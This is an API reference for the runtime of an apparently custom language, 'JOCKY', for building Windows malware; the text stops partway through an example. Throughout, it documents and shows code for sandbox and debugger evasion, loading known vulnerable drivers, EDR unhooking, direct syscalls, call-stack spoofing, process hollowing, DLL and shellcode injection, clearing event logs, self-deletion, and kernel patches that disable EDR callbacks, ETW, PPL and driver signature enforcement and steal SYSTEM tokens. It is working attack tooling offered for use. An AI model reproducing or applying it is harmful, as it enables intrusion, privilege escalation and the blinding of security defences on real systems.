# JOCKY Runtime API Reference

Every function below is compiled into the final binary (unless `--no-runtime`
is passed to `jockyc`).

**No `ffi` declarations needed.**  The compiler auto-registers all `jocky_*`
functions as LLVM external declarations before emitting user code, so you can
call any of them directly — just write `jocky_cleanup_all()` without any
boilerplate at the top of your file.  `jocky_runtime_init()` is also called
automatically at the start of `main()`.

The `ffi` declarations shown throughout this document are provided as a
reference for the exact type signatures; they are no longer required.

---

## 1  Initialization

### `jocky_runtime_init() -> i32`

**Call this first.**  Runs the full startup sequence:
1. Integrity check – aborts (`ExitProcess(0xDEAD1337)`) if the binary was
   patched after `addAntiTamper` ran during the build.
2. Debugger / VM / sandbox detection.

Returns a bitmask of detected threats (0 = clean environment).

```
ffi jocky_runtime_init() -> i32;

fn main() -> void {
    let threats: i32 = jocky_runtime_init();
    if threats != 0 {
        return;   // hostile environment – bail out
    }
    // ...
}
```

---

## 2  Anti-Analysis

### `jocky_check_analysis_environment() -> i32`

Runs all checks and returns a bitmask:

| Bit | Constant value | Meaning |
|-----|---------------|---------|
| 0   | `1`           | Debugger present |
| 1   | `2`           | Running inside a VM |
| 2   | `4`           | Sandbox detected |

```
ffi jocky_check_analysis_environment() -> i32;
```

### Individual checks  →  `bool`

```
ffi jocky_is_debugger_present()       -> bool;  // IsDebuggerPresent + CheckRemoteDebugger
ffi jocky_is_remote_debugger()        -> bool;  // CheckRemoteDebuggerPresent / TracerPid
ffi jocky_check_hardware_breakpoints()-> bool;  // DR0–DR3 registers (Windows only)
ffi jocky_is_vm()                     -> bool;  // CPUID hypervisor bit
ffi jocky_is_sandbox()                -> bool;  // timing + known sandbox DLLs/usernames
ffi jocky_check_timing_rdtsc()        -> bool;  // RDTSC delta over 50 ms sleep
ffi jocky_check_timing_api()          -> bool;  // GetTickCount delta over 500 ms sleep
```

Returns `true` when the condition is detected.

### `jocky_verify_integrity() -> bool`  *(Windows only)*

Reads the running binary from disk, recomputes the XOR-folded CRC32 of all
PE sections, and compares it against the `.jtamp` section embedded during the
build.  Calls `ExitProcess(0xDEAD1337)` on mismatch.  Returns `true` if the
check passed or if `.jtamp` is absent (unpacked build).

Called automatically by `jocky_runtime_init()`; you rarely need to call it
directly.

```
ffi jocky_verify_integrity() -> bool;
```

---

## 3  BYOVD Loader  *(Windows, requires Administrator)*

Loads the driver embedded in the `.jdrv` PE section by `jockyc --embed-driver`.

### Layout of the `jocky_byovd_t` struct in memory

The struct is 584 bytes total.  Allocate it as an `i8` array and pass a
pointer.  Do not interpret the fields directly from JOCKY – use the helpers.

```
// allocate 584 bytes on the stack (MAX_PATH*2 + 64 + 8 for HANDLE/padding)
// safest: use a global or heap buffer
ffi jocky_byovd_load(i8*, i8*, i8*)  -> bool;
ffi jocky_byovd_unload(i8*)          -> void;
```

### `jocky_byovd_load(service_name, device_name, out_ctx) -> bool`

| Parameter | Type | Meaning |
|-----------|------|---------|
| `service_name` | `i8*` / `string` | SCM service name to register (pass `0` to auto-generate `jky_<rand>`) |
| `device_name`  | `i8*` / `string` | NT device symlink, e.g. `"MyDriver"` → opens `\\.\MyDriver` (pass `0` to use service name) |
| `out_ctx`      | `i8*`            | Pointer to a 584-byte zero-initialised buffer |

Returns `true` on success.  The device handle is stored inside `out_ctx`; use
it with `DeviceIoControl` (via another `ffi`).

**What it does internally:**
1. Finds `.jdrv` section in the in-memory PE image.
2. RC4-decrypts the driver bytes using the per-build key stored in the section.
3. Drops the `.sys` to `%TEMP%\<rand8>.sys`.
4. Calls `CreateService(SERVICE_KERNEL_DRIVER)` then `StartService`.
5. Opens `\\.\<device_name>` and stores the `HANDLE` in `out_ctx`.

### `jocky_byovd_unload(ctx)`

Stops the service, calls `DeleteService`, and deletes the dropped `.sys`.
Always call this before exiting to avoid leaving artifacts.

**Example:**

```
ffi jocky_byovd_load(i8*, i8*, i8*) -> bool;
ffi jocky_byovd_unload(i8*)         -> void;

fn load_driver() -> void {
    // 584-byte buffer – in real code use a global or alloca equivalent
    let ctx: i8* = 0;   // TODO: allocate 584 bytes

    let ok: bool = jocky_byovd_load("MyVulnDrv", "MyVulnDrv", ctx);
    if !ok { return; }

    // ... send IOCTLs via DeviceIoControl ffi ...

    jocky_byovd_unload(ctx);
}
```

> **Note:** `jocky_byovd_load` returns `true` even if the device handle is
> `INVALID_HANDLE_VALUE`.  Some drivers do not create a device symlink; in
> that case resolve the device path manually and open it with a `CreateFile`
> FFI call.

---

## 4  Driver Interaction  *(Windows only, requires `jocky_byovd_load` to have run)*

Two complementary systems work together.  The high-level primitives
(`jocky_driver_read_phys` etc.) first check the built-in **static profile
table** for known vulnerable drivers; if the driver is not recognised they
fall back to the embedded **.jmani manifest**.

### Built-in static profiles

| Driver service name | `read_phys` | `write_phys` | `read_msr` | `write_msr` | `map_phys` |
|---------------------|:-----------:|:------------:|:----------:|:-----------:|:----------:|
| `RTCore64`          | ✓           | ✓            | –          | –           | –          |
| `WinRing0`          | ✓           | ✓            | ✓          | ✓           | –          |
| `WinRing0x64`       | ✓           | ✓            | ✓          | ✓           | –          |
| `gdrv`              | ✓ (via map) | –            | –          | –           | ✓          |

### `jocky_driver_read_phys(ctx, phys_addr, out, size) -> bool`

Read `size` bytes of physical memory into `out`.

```
ffi jocky_driver_read_phys(i8*, i64, i8*, i32) -> bool;
```

### `jocky_driver_write_phys(ctx, phys_addr, in, size) -> bool`

Write `size` bytes from `in` to physical address `phys_addr`.

```
ffi jocky_driver_write_phys(i8*, i64, i8*, i32) -> bool;
```

### `jocky_driver_read_msr(ctx, msr_id, out) -> bool`

Read a 64-bit model-specific register.  `out` is a pointer to a `uint64_t`.

```
ffi jocky_driver_read_msr(i8*, i32, i8*) -> bool;
```

### `jocky_driver_write_msr(ctx, msr_id, val) -> bool`

Write a 64-bit value to a model-specific register.

```
ffi jocky_driver_write_msr(i8*, i32, i64) -> bool;
```

### `jocky_driver_map_phys(ctx, phys_addr, size, out_va) -> bool`

Map a physical range and return the kernel virtual address in `*out_va`.
Currently supported by **gdrv only**.

```
ffi jocky_driver_map_phys(i8*, i64, i32, i8*) -> bool;
```

### `jocky_manifest_load() -> bool`

Parse the `.jmani` section embedded by `jockyc --manifest`.  Called
automatically by `jocky_runtime_init()`; only call manually if you skip
`jocky_runtime_init()`.  Returns `false` (not an error) if no `.jmani`
section exists.

```
ffi jocky_manifest_load() -> bool;
```

### `jocky_driver_invoke(ctx, primitive, in_buf, in_size, out_buf, out_size) -> bool`

Dispatch an arbitrary IOCTL by name from the `.jmani` manifest.

| Parameter  | Type    | Meaning |
|------------|---------|---------|
| `ctx`      | `i8*`   | byovd context from `jocky_byovd_load` |
| `primitive`| `i8*`   | name exactly as written in the manifest file |
| `in_buf`   | `i8*`   | input buffer (`0` if none) |
| `in_size`  | `i32`   | input byte count |
| `out_buf`  | `i8*`   | output buffer (`0` if none) |
| `out_size` | `i32`   | output buffer capacity |

```
ffi jocky_driver_invoke(i8*, i8*, i8*, i32, i8*, i32) -> bool;
```

### Manifest file format  (`--manifest <file>`)

One entry per line.  Comment lines start with `#`.

```
# name          ioctl       in_bytes  out_bytes
read_phys       0x9C402584  8         4
write_phys      0x9C402588  12        0
read_msr        0x9C40258C  4         8
write_msr       0x9C402590  12        0
```

The file is encoded by `jockyc --manifest` into a compact binary `.jmani`
section.  The runtime parses it on startup inside `jocky_manifest_load()`.

### Example – RTCore64 read 8 bytes at physical 0xFFFFF000

```
ffi jocky_byovd_load(i8*, i8*, i8*)  -> bool;
ffi jocky_driver_read_phys(i8*, i64, i8*, i32) -> bool;
ffi jocky_byovd_unload(i8*)          -> void;

fn main() -> void {
    let ctx: i8* = 0;   // allocate 584 bytes

    let ok: bool = jocky_byovd_load("RTCore64", "RTCore64", ctx);
    if !ok { return; }

    let buf: i8* = 0;   // allocate 8 bytes
    let read_ok: bool = jocky_driver_read_phys(ctx, 0xFFFFF000, buf, 8);

    jocky_byovd_unload(ctx);
}
```

### Example – unknown driver via manifest (`--manifest mydrv.txt`)

```
ffi jocky_byovd_load(i8*, i8*, i8*)              -> bool;
ffi jocky_driver_invoke(i8*, i8*, i8*, i32, i8*, i32) -> bool;

fn main() -> void {
    let ctx: i8* = 0;   // 584 bytes

    let ok: bool = jocky_byovd_load("MyVulnDrv", "MyVulnDrv", ctx);
    if !ok { return; }

    let req: i8* = 0;   // 8 bytes  (size|phys_addr)
    let out: i8* = 0;   // 4 bytes
    jocky_driver_invoke(ctx, "read_phys", req, 8, out, 4);
}
```

---

## 5  Evasion  *(Windows only)*

### `jocky_unhook_ntdll() -> bool`

Reloads a clean copy of `ntdll.dll` from `System32`, finds its `.text`
section, and overwrites the in-memory `.text` of the currently-mapped ntdll.
Removes user-mode inline hooks placed by EDR/AV products.

Call before any sensitive ntdll-routed syscall.

```
ffi jocky_unhook_ntdll() -> bool;
```

---

### `jocky_get_syscall_number(zw_name) -> i32`

Resolve the Windows syscall service number (SSN) for a `Zw*`/`Nt*` function
without relying on the (possibly hooked) ntdll stub.

**Hell's Gate** — reads the SSN directly from the standard `4C 8B D1 B8 xx xx xx xx`
prologue if the stub has not been patched.

**Halo's Gate** — if the stub is hooked (first bytes differ from the expected
pattern), scans up to 48 adjacent `Zw*` exports in the name table
(alphabetical order = monotone SSN order) to find an unhooked neighbor and
derives the target SSN by offset.

```
ffi jocky_get_syscall_number(i8*) -> i32;

let ssn: i32 = jocky_get_syscall_number("NtAllocateVirtualMemory");
```

Returns `0xFFFFFFFF` if resolution fails entirely.

---

### `jocky_direct_syscall(ssn, a1, a2, a3, a4) -> i64`
### `jocky_direct_syscall4(ssn, a1, a2, a3, a4) -> i64`  *(alias)*

Allocate a one-shot RWX stub containing:

```
mov r10, rcx
mov eax, <ssn>
syscall
ret
```

Call it via a typed function pointer so the C calling convention places extra
arguments at the correct `[rsp+0x28]`, `[rsp+0x30]` offsets as expected by
the Windows kernel.  Does not call through ntdll at all.

```
ffi jocky_direct_syscall(i32, i64, i64, i64, i64) -> i64;
```

---

### `jocky_find_ret_gadget() -> i8*`

Scan ntdll.dll's `.text` section for a `ret; int3` byte pair (`0xC3 0xCC`).
Falls back to any `0xC3` in `.text` if no clean pair is found.  The result
is cached after the first successful call.

```
ffi jocky_find_ret_gadget() -> i8*;
```

---

### `jocky_spoof_call(fn, a1, a2, a3, a4) -> i64`

Call `fn(a1,a2,a3,a4)` with the immediate return address on the stack
replaced by a RET gadget inside ntdll.dll.

While `fn` executes, a stack walk shows:

```
fn  ←  ntdll!<ret gadget>   (legitimate module)
       our real return addr  (buried deeper, not examined by most EDRs)
```

Implemented as a dynamically-built 28-byte trampoline stub (no inline
assembly):

```
pop  rax                ; save call-return address
mov  r11, <gadget VA>   ; 64-bit gadget address
push rax                ; push deeper (gadget ret → home)
push r11                ; visible return address = ntdll gadget
jmp  [rip+0]            ; jump to fn
.qword fn
```

Falls back to a plain call if no gadget is found or the RWX allocation fails.

```
ffi jocky_spoof_call(i8*, i64, i64, i64, i64) -> i64;
```

---

### `jocky_spoof_syscall(ssn, a1, a2, a3, a4) -> i64`

Same stack-spoofing trampoline as `jocky_spoof_call`, but the jump target is
replaced with an inline `mov r10,rcx; mov eax,ssn; syscall; ret` body.

The kernel sees a return address inside ntdll when it inspects the user-mode
call stack.

```
ffi jocky_spoof_syscall(i32, i64, i64, i64, i64) -> i64;
```

---

### `jocky_find_trusted_pid(candidates, n_candidates) -> u32`

Scan the running process list for the first match from `candidates[]`.  Uses
`CreateToolhelp32Snapshot` — no suspicious handle opens required.

Default search order (used when `candidates` is `NULL`):

| Priority | Process |
|---|---|
| 1 | `OneDrive.exe` |
| 2 | `RuntimeBroker.exe` |
| 3 | `sihost.exe` |
| 4 | `SearchHost.exe` |
| 5 | `explorer.exe` |
| 6 | `svchost.exe` |

```
ffi jocky_find_trusted_pid(i8**, i32) -> i32;
```

---

### `jocky_trusted_spoof_call(target_fn, trusted_pid, candidates, n, a1..a4) -> i64`  *(Moonwalk++)*

**Full synthetic call stack** sourced from a trusted process image — every
return address visible to `RtlWalkFrameChain` is a real `ret` gadget (0xC3)
inside a locally-mapped copy of the trusted process's `.text` section.

#### Technique

| Step | What happens |
|---|---|
| 1 | `jocky_find_trusted_pid()` → choose host (OneDrive etc.) |
| 2 | `OpenProcess(PROCESS_VM_READ)` → `ReadProcessMemory` copies `.text` |
| 3 | `VirtualAlloc(PAGE_EXECUTE_READWRITE)` stores the copy locally |
| 4 | Scan copy for `ret; int3` (0xC3 0xCC) gadgets — collect 4+ |
| 5 | Dynamically build trampoline stub that places gadget addresses on stack |
| 6 | JMP to `target_fn` (args forwarded via rcx/rdx/r8/r9) |
| 7 | `VirtualFree` stub + copy after `target_fn` returns |

#### Call stack seen by EDR / `RtlWalkFrameChain`

```
target_fn  (e.g. NtAllocateVirtualMemory)
  ← OneDrive.exe!<ret gadget @ +0x????> — in locally-mapped .text copy
  ← OneDrive.exe!<ret gadget @ +0x????> — each is a real 0xC3 byte
  ← OneDrive.exe!<ret gadget @ +0x????>
  ← OneDrive.exe!<ret gadget @ +0x????>
  ← (our real return address — buried 4 frames deep)
```

#### CPU execution chain (when `target_fn` does its RET)

```
target_fn RETs → gadget0 (0xC3 = ret) → gadget1 (ret) → gadget2 (ret)
             → gadget3 (ret) → real_return_addr (our code) ✓
```

#### Fallback

If the trusted process is unavailable or yields fewer than 2 gadgets,
automatically falls back to `jocky_spoof_call()` (single ntdll frame).

```
ffi jocky_trusted_spoof_call(i8*, i32, i8**, i32, i64, i64, i64, i64) -> i64;
```

#### Usage example

```jky
ffi jocky_find_trusted_pid(i8**, i32) -> i32;
ffi jocky_trusted_spoof_call(i8*, i32, i8**, i32,
                              i64, i64, i64, i64)   -> i64;
ffi NtAllocateVirtualMemory(i8*, i8**, i64,
                             i64*, i32, i32)          -> i32;

fn main() -> void {
    // Option A: fully automatic — picks OneDrive/RuntimeBroker/etc.
    let pid: i32 = 0;

    // Option B: specific trusted process
    // let pid: i32 = jocky_find_trusted_pid(null, 0);

    let base: i8* = null;
    let size: i64 = 0x1000;

    // NtAllocateVirtualMemory(-1, &base, 0, &size,
    //     MEM_COMMIT|MEM_RESERVE=0x3000, PAGE_EXECUTE_READWRITE=0x40)
    // ... called with all 4 return addresses on stack pointing to OneDrive
    let st: i32 = jocky_trusted_spoof_call(
        NtAllocateVirtualMemory,   // target
        pid,                       // trusted pid (0 = auto)
        null, 0,                   // candidates (null = built-in list)
        -1,                        // a1: process handle (current)
        &base,                     // a2: base address out
        0,                         // a3: zero bits
        &size                      // a4: region size
    );
    // st == 0 → success; base points to allocated RWX page
}
```

---

## 6  Execution  *(Windows only)*


Five complementary in-memory execution primitives.  All require
`PROCESS_ALL_ACCESS` on the target (i.e., elevated privileges or a
same-integrity target).

---

### `jocky_process_hollow(target_path, payload, payload_size) -> bool`

**Process hollowing** — `CreateProcessW(CREATE_SUSPENDED)` → unmap the
target's original image → write `payload` headers and sections at the same
base → patch `PEB.ImageBaseAddress` and the initial thread's `Rcx` → resume.

```
ffi jocky_process_hollow(i8*, i8*, i64) -> bool;
```

| Parameter | Meaning |
|-----------|---------|
| `target_path`  | Wide-char path to the host process – pass as `i8*` |
| `payload`      | Raw PE image bytes |
| `payload_size` | Byte count |

---

### `jocky_module_stomp(pid, module_name, payload, payload_size) -> bool`

**Module stomping** — finds `module_name` in `pid`'s loaded-module list,
calls `VirtualProtectEx` to make that region `RWX`, overwrites headers and
sections with `payload`, then `CreateRemoteThread` at the payload entry point.

The stomped module's entry remains in the PEB loader list, so any stack walk
that originates from the new code shows a legitimate module name.

```
ffi jocky_module_stomp(i32, i8*, i8*, i64) -> bool;
```

| Parameter | Meaning |
|-----------|---------|
| `pid`         | Target PID |
| `module_name` | Wide-char name as it appears in Task Manager, e.g. `"clr.dll"` |
| `payload`     | Raw PE image |
| `payload_size`| Byte count |

---

### `jocky_rdll_inject(pid, dll_bytes, dll_size) -> bool`

**Reflective DLL injection** — copies `dll_bytes` to a fresh `RWX` allocation
in `pid`, locates the `ReflectiveLoader` export inside the raw bytes, and
`CreateRemoteThread`s at it with `remote_base` as the argument.

The `ReflectiveLoader` function inside the DLL is responsible for:
1. Applying base relocations.
2. Walking its own IAT and resolving imports via the PEB loader list.
3. Calling `DllMain(hModule, DLL_PROCESS_ATTACH, NULL)`.

Returns `false` immediately if the DLL has no `ReflectiveLoader` export.
The DLL must be compiled as a reflective loader (see the
[ReflectiveDLLInjection](https://github.com/stephenfewer/ReflectiveDLLInjection)
reference implementation).

```
ffi jocky_rdll_inject(i32, i8*, i64) -> bool;
```

| Parameter  | Meaning |
|------------|---------|
| `pid`      | Target PID |
| `dll_bytes`| Raw DLL file bytes (file layout, not mapped layout) |
| `dll_size` | Byte count |

---

### `jocky_p3_poison(pid, fake_cmdline, fake_image_path) -> bool`

**Process parameter poisoning (P³)** — overwrites
`PEB.RTL_USER_PROCESS_PARAMETERS.CommandLine` and/or `.ImagePathName` in
`pid`'s address space.  After this call, any tool or EDR that reads those
fields via `ReadProcessMemory` (Process Hacker, Sysmon) will see the spoofed
values.

Each new string is written into a freshly-allocated `PAGE_READWRITE` region so
the existing string buffers are not corrupted.  The `UNICODE_STRING.Buffer`
pointer and both length fields are updated atomically per field.

Pass `NULL` for any field you do not want to change.

```
ffi jocky_p3_poison(i32, i8*, i8*) -> bool;
```

| Parameter         | Meaning |
|-------------------|---------|
| `pid`             | Target PID |
| `fake_cmdline`    | New `CommandLine` wide string, or `0` |
| `fake_image_path` | New `ImagePathName` wide string, or `0` |

> **Note:** This patches the in-memory PEB only.  The `CommandLine` reported
> by `GetCommandLineW` from *within* the target process reads the same PEB
> field, so the target itself will also see the spoofed value if it calls that
> API after the patch.

---

### `jocky_thread_hijack(pid, shellcode, shellcode_size) -> bool`

**Thread execution hijacking** — finds the first thread in `pid` (excluding
the caller's own), suspends it, injects `shellcode` into a fresh `RWX`
allocation, redirects the thread's `RIP` to the shellcode, and resumes.

The hijacked thread executes the shellcode next time it is scheduled.
The shellcode is responsible for preserving any registers and stack state if
it wants to return cleanly to the original thread context.

```
ffi jocky_thread_hijack(i32, i8*, i64) -> bool;
```

| Parameter        | Meaning |
|------------------|---------|
| `pid`            | Target PID |
| `shellcode`      | Raw shellcode bytes |
| `shellcode_size` | Byte count |

---

### Combined execution example

```
ffi jocky_runtime_init()                      -> i32;
ffi jocky_unhook_ntdll()                      -> bool;
ffi jocky_p3_poison(i32, i8*, i8*)            -> bool;
ffi jocky_rdll_inject(i32, i8*, i64)          -> bool;

fn main() -> void {
    let t: i32 = jocky_runtime_init();
    if t != 0 { return; }

    jocky_unhook_ntdll();

    // Spoof explorer.exe's command line before injecting
    let pid: i32 = 1234;   // explorer.exe PID
    jocky_p3_poison(pid, "C:\\Windows\\explorer.exe", 0);

    // Inject a reflective DLL (dll_buf / dll_len populated earlier)
    let dll_buf: i8* = 0;   // pointer to DLL bytes
    let dll_len: i64 = 0;   // byte count
    jocky_rdll_inject(pid, dll_buf, dll_len);
}
```

---

## 7  Cleanup

### `jocky_self_delete() -> bool`

Three-tier approach (Windows):
1. **POSIX semantics** (Win10 1809+) — `NtSetInformationFile(FileDispositionInformationEx)` with `FILE_DISPOSITION_FLAG_POSIX_SEMANTICS`: path is unlinked immediately while the process is still running.
2. **Rename + delete-on-close** (Win7+) — binary moved to `%TEMP%`, opened with `FILE_FLAG_DELETE_ON_CLOSE`, deleted when the last handle drops at process exit.
3. **Reboot delete** — `MoveFileExW(MOVEFILE_DELAY_UNTIL_REBOOT)` fallback.

**Linux:** unlinks `/proc/self/exe` immediately.

```
ffi jocky_self_delete() -> bool;
```

### `jocky_clear_logs() -> bool`

**Windows:** enumerates *all* event log channels via `EvtOpenChannelEnum` /
`EvtClearLog` — including Sysmon, PowerShell/Operational, WMI-Activity, and
every security channel — then clears the four classic logs via `ClearEventLogA`.
No child processes are spawned.

**Linux:** rotates and vacuums the systemd journal; truncates `wtmp`/`lastlog`.

```
ffi jocky_clear_logs() -> bool;
```

### `jocky_wipe_artifacts() -> bool`

**Windows:** deletes Prefetch `.pf` files (`%SystemRoot%\Prefetch\*.pf`),
Recent document shortcuts (`%APPDATA%\Microsoft\Windows\Recent\*`), and
contents of `%TEMP%`.  Uses Win32 file APIs — no child processes.

**Linux:** clears bash history and `/tmp/.jocky*`.

```
ffi jocky_wipe_artifacts() -> bool;
```

---

## 8  Crypto Helpers

### `jocky_decrypt_xor(data, len, key)`

In-place XOR decrypt with a rotating key (`key = (key << 1) | (key >> 7)`
after each byte).

```
ffi jocky_decrypt_xor(i8*, i64, i8) -> void;
```

### `jocky_decrypt_rc4(data, len, key, key_len)`

In-place RC4 stream decrypt.  `key` is a byte array of `key_len` bytes.

```
ffi jocky_decrypt_rc4(i8*, i64, i8*, i64) -> void;
```

---

## 9  Typical program skeleton

```
ffi jocky_runtime_init()     -> i32;
ffi jocky_unhook_ntdll()     -> bool;
ffi jocky_byovd_load(i8*, i8*, i8*) -> bool;
ffi jocky_byovd_unload(i8*)  -> void;
ffi jocky_self_delete()      -> bool;
ffi jocky_clear_logs()       -> bool;

fn main() -> void {
    // 1. Integrity + environment check
    let threats: i32 = jocky_runtime_init();
    if threats != 0 { return; }

    // 2. Strip EDR hooks
    jocky_unhook_ntdll();

    // 3. Load embedded driver
    let ctx: i8* = 0;   // allocate 584 bytes
    let ok: bool = jocky_byovd_load(0, "VulnDrv", ctx);
    if !ok { return; }

    // 4. ... exploit the driver via DeviceIoControl ...

    // 5. Cleanup
    jocky_byovd_unload(ctx);
    jocky_clear_logs();
    jocky_self_delete();
}
```

---

---

## 10  Kernel Exploitation Primitives  *(Windows only, requires BYOVD)*

All functions here require a `jocky_byovd_t` filled by `jocky_byovd_load()`.

### Bootstrap (happens automatically on first call)

1. OS build number (via `RtlGetVersion`) → selects EPROCESS offset table.
   Four entries cover all major Windows 10/11 releases:

   | Build range | Epoch | UniqueProcessId | Token | _OBJECT_TYPE.CallbackList |
   |---|---|---|---|---|
   | 10240 – 14392 | Win10 1507/1511 | 0x2E8 | 0x358 | 0x0B8 |
   | 14393 – 18361 | Win10 1607–1809 | 0x2E8 | 0x358 | 0x0B8 |
   | 18362 – 22631 | Win10 1903–22H2 / Win11 21H2–23H2 | 0x440 | 0x4B8 | 0x0C8 |
   | 26100+        | Win11 24H2+     | 0x440 | 0x4B8 | 0x0C8 |

   `_TOKEN.Privileges.Enabled` offsets are also selected per-build (0x48/0x50 pre-1903, 0x50/0x58 post-1903).
2. `NtQuerySystemInformation` → ntoskrnl VA + size.
3. Physical memory scan (0x80000 → 1 GB) → System EPROCESS (PID 4).
4. Read `EPROCESS.DirectoryTableBase` at that PA → CR3.
5. All subsequent calls translate kernel VAs via 4-level page-table walk + `jocky_driver_read/write_phys`.

The scan takes ≈ 1–3 s on first call.  All subsequent calls use the cached CR3.

---

### `jocky_kread(ctx, kva, out, size) -> bool`
### `jocky_kwrite(ctx, kva, in, size) -> bool`

Read/write arbitrary kernel virtual memory.  These are the low-level
primitives all exploitation functions are built on.  Exposed publicly for
advanced use (e.g. reading EPROCESS fields not wrapped by a higher-level
function).

```
ffi jocky_kread (i8*, i64, i8*, i32) -> bool;
ffi jocky_kwrite(i8*, i64, i8*, i32) -> bool;
```

---

### `jocky_disable_edr_callbacks(ctx) -> bool`

Zeroes every active `RoutineBlock*` in the three kernel notify arrays:

| Array | Max slots | Effect |
|-------|-----------|--------|
| `PspCreateProcessNotifyRoutine` | 64 | EDR misses process creation |
| `PspCreateThreadNotifyRoutine`  | 64 | EDR misses thread creation |
| `PspLoadImageNotifyRoutine`     | 64 | EDR misses image loads |

Finds each array by scanning the first 256 bytes of the corresponding
`Ps*NotifyRoutine` export for a `LEA` instruction referencing the array.

Returns `true` if at least one callback was removed.

```
ffi jocky_disable_edr_callbacks(i8*) -> bool;
```

---

### `jocky_disable_etw(ctx) -> bool`

Finds and zeroes the `EtwpEventEnabled` flag referenced in `EtwEventWrite`
(or `EtwEventWriteFull` / `EtwEventWriteEx` as fallbacks).  Once cleared,
all kernel `EtwEventWrite` paths return without logging.

```
ffi jocky_disable_etw(i8*) -> bool;
```

---

### `jocky_disable_etw_ti(ctx) -> bool`

Targets the **Microsoft-Windows-Threat-Intelligence** ETW provider
(`{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}`) specifically.  EDRs subscribe
to this provider at the PPL-protected kernel level; it survives the global
`EtwpEventEnabled` patch made by `jocky_disable_etw()`.

Two complementary passes:

**A — Per-function enable flags.**  Finds each `EtwTiLog*` export in
ntoskrnl (`EtwTiLogReadWriteVm`, `EtwTiLogCreateUpdateProcThread`,
`EtwTiLogMapViewOfSection`, `EtwTiLogAllocateVirtualMemory`,
`EtwTiLogQueueApcThread`, `EtwTiLogSetContextThread`,
`EtwTiLogProtectExecVm`) and zeros the RIP-relative enable-flag byte in
each function's prologue.

**B — GUID-entry disable.**  Scans the ntoskrnl image for the 16-byte TI
provider GUID and zeros the `IsEnabled` counter in the `_ETW_GUID_ENTRY`
at GUID+0x18.  This removes the provider at the registration level
regardless of which `EtwTiLog*` path fires.

Call this **in addition to** `jocky_disable_etw()` — they patch different
flags.

```
ffi jocky_disable_etw_ti(i8*) -> bool;
```

---

### `jocky_disable_ob_callbacks(ctx) -> bool`

Removes **object callbacks** (`ObRegisterCallbacks`) for process and thread
object types.  EDR drivers register these to intercept `OpenProcess` /
`OpenThread` and strip `PROCESS_VM_READ`, `PROCESS_ALL_ACCESS` from the
granted access mask — this is the mechanism that blocks process injection
even after notify callbacks have been removed.

Walks `_OBJECT_TYPE.CallbackList` for `PsProcessType` and `PsThreadType`
(both exported from ntoskrnl).  For each active `_OB_CALLBACK_ENTRY`:

1. Sets `Active = FALSE`.
2. Nulls `PreOperation` and `PostOperation` function pointers.

The `_OBJECT_TYPE.CallbackList` offset is selected from the build-specific
offset table (`0x0B8` pre-1903, `0x0C8` on 1903+).

Returns `true` if at least one callback entry was disabled.

```
ffi jocky_disable_ob_callbacks(i8*) -> bool;
```

---

### `jocky_strip_ppl(ctx, pid) -> bool`

Clears `EPROCESS.Protection` (the `PS_PROTECTION` byte) for the given PID.

| Byte value | Meaning |
|-----------|---------|
| `0x72`    | PPL Antimalware |
| `0x62`    | PPL Windows |
| `0x41`    | PP Windows TCB |
| `0x00`    | No protection (after this call) |

After stripping, the process can be opened with `PROCESS_ALL_ACCESS`.

```
ffi jocky_strip_ppl(i8*, i32) -> bool;
```

---

### `jocky_elevate_token(ctx, target_pid) -> bool`

Replaces `EPROCESS.Token` of `target_pid` with the SYSTEM process token,
granting the target process SYSTEM-level privileges.  The low 4 bits of the
`EX_FAST_REF` reference count are preserved from the original token.

```
ffi jocky_elevate_token(i8*, i32) -> bool;
```

### `jocky_downgrade_token(ctx, target_pid) -> bool`

Strips `SeDebugPrivilege` (bit 20), `SeTcbPrivilege` (bit 7), and
`SeLoadDriverPrivilege` (bit 10) from the `Enabled` and `EnabledByDefault`
bitmasks inside `target_pid`'s primary token.

```
ffi jocky_downgrade_token(i8*, i32) -> bool;
```

---

### `jocky_disable_dse(ctx) -> bool`

Sets `g_CiOptions` in `ci.dll` to `0`, disabling Driver Signature
Enforcement.  Finds `g_CiOptions` by scanning `CiInitialize` for a MOV
instruction that stores the initial option value (typically `6`).

> **⚠ PatchGuard monitors `g_CiOptions`.**  Call this only inside a
> PG-suppression window.  The original value is cached; always call
> `jocky_restore_dse()` before unloading the driver to avoid a KeBugCheck.

```
ffi jocky_disable_dse(i8*) -> bool;
```

### `jocky_restore_dse(ctx) -> bool`

Restores `g_CiOptions` to the value captured by `jocky_disable_dse()`.
No-op (returns `false`) if `jocky_disable_dse` was never called.

```
ffi jocky_restore_dse(i8*) -> bool;
```

---

### `jocky_dse_load_driver(ctx, driver_path, service_name) -> bool`

**Recommended function for loading unsigned drivers.**  Wraps
`jocky_disable_dse` + `NtLoadDriver` + `jocky_restore_dse` into a single
timed, PatchGuard-safe window.

| Phase | Action |
|---|---|
| **Pre-window** | Enable `SeLoadDriverPrivilege`; register SCM service entry |
| **Window open** | `jocky_disable_dse(ctx)` → `CI!g_CiOptions = 0` |
| **Load** | `NtLoadDriver(\Registry\...\<svc>)` — direct NTAPI, no SCM round-trip |
| **Window close** | `jocky_restore_dse(ctx)` — **unconditional**, even on load error |
| **Post-window** | Delete SCM service entry; driver remains loaded in kernel |

Target window duration: **< 500 ms** (dominated by driver `DriverEntry`, not
the patch itself).  The restore is guaranteed to run even if `NtLoadDriver`
blocks or returns an error, keeping the patched state duration well below
PatchGuard's re-verification timer (~5–10 minutes on retail builds).

`service_name` may be `NULL` to auto-generate a name from a hash of the path.

```
ffi jocky_dse_load_driver(i8*, i8*, i8*) -> bool;
```

---

### DSE section example

```jky
ffi jocky_byovd_load(i8*, i8*, i8*)     -> bool;
ffi jocky_disable_edr_callbacks(i8*)    -> bool;
ffi jocky_disable_etw(i8*)              -> bool;
ffi jocky_dse_load_driver(i8*, i8*, i8*)-> bool;   // NEW: all-in-one
ffi jocky_elevate_token(i8*, i32)       -> bool;
ffi jocky_byovd_unload(i8*)             -> void;

fn main() -> void {
    let ctx: i8* = 0;
    let ok: bool = jocky_byovd_load("WinRing0x64", "WinRing0_1_2_0", ctx);
    if !ok { return; }

    // Blind EDR before loading our payload driver
    jocky_disable_edr_callbacks(ctx);
    jocky_disable_etw(ctx);

    // Load unsigned driver — DSE window opens and closes automatically
    // g_CiOptions is patched for < 500 ms then unconditionally restored
    let loaded: bool = jocky_dse_load_driver(
        ctx,
        "C:\\payload.sys",   // absolute path to unsigned .sys
        "payload_svc"        // SCM service name (NULL = auto)
    );

    if loaded {
        // payload.sys is now running as a kernel driver
        // Use jocky_byovd_t or direct IOCTL to communicate with it
    }

    // Escalate self to SYSTEM
